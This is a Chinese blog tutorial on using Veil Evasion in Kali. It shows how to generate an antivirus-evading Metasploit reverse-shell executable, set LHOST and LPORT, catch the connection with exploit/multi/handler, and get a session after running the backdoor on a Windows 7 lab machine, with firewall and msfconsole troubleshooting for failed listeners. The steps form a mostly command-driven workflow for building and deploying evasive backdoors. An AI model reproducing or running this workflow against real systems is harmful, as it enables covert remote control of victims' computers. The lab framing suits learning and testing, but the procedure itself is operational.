# 原创
：  【kali-漏洞利用】（3.4）免杀Payload 生成工具（下）：Veil后门使用、监听失败原因

# 【kali-漏洞利用】（3.4）免杀Payload 生成工具（下）：Veil后门使用、监听失败原因

**目录**

[一、veil使用](#veil%E4%BD%BF%E7%94%A8)

[1.1、启动：](#1.1%E3%80%81%E5%90%AF%E5%8A%A8%EF%BC%9A)

[1.2、分类](#1.2%E3%80%81%E5%88%86%E7%B1%BB)

[1.3、利用msf测试](#1.3%E3%80%81%E5%88%A9%E7%94%A8msf%E6%B5%8B%E8%AF%95)

[启动：](#%E5%90%AF%E5%8A%A8%EF%BC%9A)

[利用模块：](#%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97%EF%BC%9A)

[1.4、免杀payload被运行](#1.4%E3%80%81%E5%85%8D%E6%9D%80payload%E8%A2%AB%E8%BF%90%E8%A1%8C)

[win7](#win7)

[winxp](#winxp)

[1.5、结果](#1.5%E3%80%81%E7%BB%93%E6%9E%9C)

[1.6、错误：](#1.6%E3%80%81%E9%94%99%E8%AF%AF%EF%BC%9A)

---


## 一、veil使用

> 
<h3>1.1、启动：</h3>
打开终端，并输入veil进入交互界面



> 
<h3>1.2、分类</h3>
veil有两个免杀的⼯具：Evasion和Ordnance
Evasion⽤来对⽂件进行免杀处理
Ordnance可⽣成在Veil-Evasion中使⽤的shellcode
<pre><code>use Evasion
   #选择Evasion功能 </code></pre>


<pre><code>list 
   #查看payload列</code></pre>


大多选用go和ruby语言编码的
use 7

 Required Options:需要都填上（这里LHOST为空，要补上，其余的可以修改）
<pre><code>Required Options:
                                                                                                          
Name                    Value           Description
----                    -----           -----------
COMPILE_TO_EXE          Y               Compile to an executable
LHOST                                   IP of the Metasploit handler
LPORT                   4444            Port of the Metasploit handler
</code></pre>
输入 generate 执行payload
然后输入产生的文件名


/var/lib/veil/output/compiled/test.exe

 Executable（可执行）
Source code(源代码)
Metasploit Resource（Metasploit资源）



> 
<h3>1.3、利用msf测试</h3>
<h4>启动：</h4>
sudo msfconsole -r /var/lib/veil/output/handlers/test.rc<br/><img alt="" height="245" src="https://img-blog.csdnimg.cn/d6a8d0d2e9404ff9a0fabd7c71797f32.png" width="714"/>
<img alt="" height="365" src="https://img-blog.csdnimg.cn/3e1ef2661c7448b7884b77db8bd13185.png" width="837"/> 

<hr/>
<h4>利用模块：</h4>
use exploit/multi/handler
show options


set lhost 192.168.190.149
exploit
(然后开始监听了) 



#### 利用模块：

> 
<h3>1.4、免杀payload被运行</h3>
<h4>win7</h4>
现在将后门放到目标机中（这里是win7）
然后运行它

 
 

<h4>winxp</h4>
我现在试一下winxp


 <img alt="" height="309" src="https://img-blog.csdnimg.cn/a91f97b9fdee49f68780711059806a98.png" width="645"/>
 



#### winxp

> 
<h3>1.5、结果</h3>
winxp测试的2次，就是那个后门在winxp上运行时候报错
然后监听失败

 
<hr/>
win7测试的2次
在win7上运行没有保错

 
 最后出现了会话控制<img alt="" height="152" src="https://img-blog.csdnimg.cn/b1b6276d58dd4e558b4856df66c6269a.png" width="1077"/>
 


> 
<h3>1.6、无法监听错误改正</h3>
<h4>错误过程一：</h4>
无法监听到后门端口
随机设置的端口没有开放
<pre><code>lsof -i:端口号

没查到端口信息</code></pre>
<pre><code>systemctl start firewalld

firewall-cmd --zone=public --add-port=1935/tcp --permanent



--zone #作用域 
 
--add-port=1935/tcp #添加端口，格式为：端口/通讯协议 
 
--permanent #永久生效，没有此参数重启后失效

firewall-cmd --reload //重启防火墙</code></pre>


<pre><code>netstat -ntlp   //查看当前所有tcp端口· 
 
netstat -ntulp |grep 1935   //查看所有1935端口使用情况  </code></pre>


<hr/>
<h4>错误过程二：</h4>
最后我认为是
先用nmap扫描目标开放的tcp端口，然后再生成相应端口的木马
使自己，和目标开放端口都一样
<hr/>
<h4>最后错误原因</h4>
是我启动的时候
直接是sudo msfconsole
<hr/>
<h4>正确做法：</h4>
通过以下方法启动msfconsole
sudo msfconsole -r /var/lib/veil/output/handlers/test.rc



#### 错误过程二：

---


#### 正确做法：
